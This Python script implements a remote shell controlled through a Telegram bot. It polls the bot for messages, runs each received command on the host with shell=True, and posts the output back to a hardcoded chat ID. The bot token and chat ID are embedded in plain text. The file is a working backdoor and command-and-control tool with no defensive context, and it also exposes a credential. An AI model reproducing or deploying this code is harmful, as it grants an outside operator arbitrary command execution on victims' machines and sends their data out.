import subprocess
import requests
import time

def get_last_telegram_message():
    token = "7087007103:AAEo_2SctgdfdsXBwK0428Az2yiMttOgKi0"
    url = f"https://api.telegram.org/bot{token}/getUpdates"
    
    response = requests.get(url)
    
    if response.status_code == 200:
        updates = response.json()
        
        if 'result' in updates and updates['result']:
            # Get the last update
            last_update = updates['result'][-1]
            
            # Extract the message text from the last update
            if 'message' in last_update and 'text' in last_update['message']:
                return last_update['message']['text']
            else:
                print("No text message found in the last update.")
                return None
        else:
            print("No messages found.")
            return None
    else:
        print(f"Failed to get updates. Error: {response.text}")
        return None

def cmd(command):
    try:
        # Run the command and capture the output
        result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        # Return the error output if the command fails
        return e.output
    except Exception as e:
        # Return a generic error message for other exceptions
        return str(e)

def send_telegram_message(message):
    token = '7087007103:AAEo_2SctgdfdsXBwK0428Az2yiMttOgKi0'
    chat_id = '834850019'
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    
    response = requests.post(url, data=payload)
    
    if response.status_code == 200:
        print("Message sent successfully!")
    else:
        print(f"Failed to send message. Error: {response.text}")

def main():
    done = True
    shell_mode = False
    previous_message = ""

    while done:
        last_message = get_last_telegram_message()
        
        # Avoid processing the same message repeatedly
        if last_message == previous_message:
            time.sleep(1)  # Wait a bit before checking for a new message
            continue
        
        previous_message = last_message
        
        if last_message == "commands":
            send_telegram_message("shell")
        elif last_message == "shell":
            send_telegram_message("Entering shell mode. Send 'exit' to leave.")
            shell_mode = True
        elif last_message == "exit":
            send_telegram_message("Exiting shell mode")
            shell_mode = False
            done=False
            
        elif shell_mode:
            if last_message:
                print("The command sent is", last_message)
                out = cmd(last_message)
                send_telegram_message(out)
